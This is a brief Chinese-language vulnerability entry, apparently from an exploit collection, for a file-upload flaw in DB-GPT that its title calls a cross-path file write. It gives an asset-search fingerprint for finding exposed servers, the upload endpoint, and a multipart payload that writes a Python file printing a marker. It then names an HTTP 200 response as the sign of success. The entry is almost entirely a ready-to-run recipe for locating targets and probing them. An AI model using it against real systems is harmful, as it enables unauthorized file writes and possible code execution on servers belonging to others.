# DB-GPTupload存在跨路径文件写入漏洞

DB ｜ 任意文件读取/写入 ｜ —
- **指纹**：`icon_hash="100632689"`
- **请求**：`POST /api/v1/python/file/upload HTTP/1.1`

**Payload**
```
------Boundary1752894263714
Content-Disposition: form-data; name="file"; filename="33223.py"
Content-Type: text/x-python
print("33223")
------Boundary1752894263714--
```
- **响应特征**：200